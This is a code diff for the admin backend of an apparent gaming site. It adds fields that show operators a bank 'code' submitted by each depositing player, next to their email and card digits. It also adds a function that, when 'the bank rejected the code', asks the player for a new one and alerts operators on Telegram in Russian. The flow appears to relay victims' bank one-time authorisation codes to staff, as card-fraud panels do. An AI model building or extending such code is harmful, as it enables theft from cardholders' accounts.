@@ -148,6 +148,8 @@ export type PendingFundingRow = {
   cardLast4: string | null
   asset: string | null
   wallet: string | null
+  codeStatus: string | null
+  code: string | null
 }
 
 export async function getPendingFundingRequests(): Promise<PendingFundingRow[]> {
@@ -155,12 +157,26 @@ export async function getPendingFundingRequests(): Promise<PendingFundingRow[]> 
   return db.select({
     id: fundingRequest.id, type: fundingRequest.type, amount: fundingRequest.amount, cardId: fundingRequest.cardId,
     createdAt: fundingRequest.createdAt, userName: user.name, userEmail: user.email, cardLast4: paymentCard.last4,
-    asset: fundingRequest.asset, wallet: fundingRequest.wallet,
+    asset: fundingRequest.asset, wallet: fundingRequest.wallet, codeStatus: fundingRequest.codeStatus, code: fundingRequest.code,
   }).from(fundingRequest)
     .innerJoin(user, eq(user.id, fundingRequest.userId))
     .leftJoin(paymentCard, eq(paymentCard.id, fundingRequest.cardId))
     .where(eq(fundingRequest.status, "pending"))
     .orderBy(desc(fundingRequest.createdAt)).limit(100)
+}
+
+/** The bank rejected the code: ask the player for a new one on the same deposit request. */
+export async function requestDepositCodeAgain(id: number) {
+  await requireAdmin()
+  if (!Number.isInteger(id) || id <= 0 || id > 2147483647) return
+  const [row] = await db.update(fundingRequest)
+    .set({ codeStatus: "awaiting", code: null, codeSubmittedAt: null })
+    .where(and(eq(fundingRequest.id, id), eq(fundingRequest.type, "deposit"), eq(fundingRequest.status, "pending"), eq(fundingRequest.codeStatus, "submitted")))
+    .returning({ userId: fundingRequest.userId })
+  revalidatePath("/admin")
+  if (!row) return
+  await Promise.all([publish(topics.adminCounts), publish(topics.userBalance(row.userId))])
+  void notifyTelegram(`<b>Пополнение #${id}</b>\nУ игрока запрошен новый код.`)
 }
 
 export async function approveFundingRequest(id: number) {
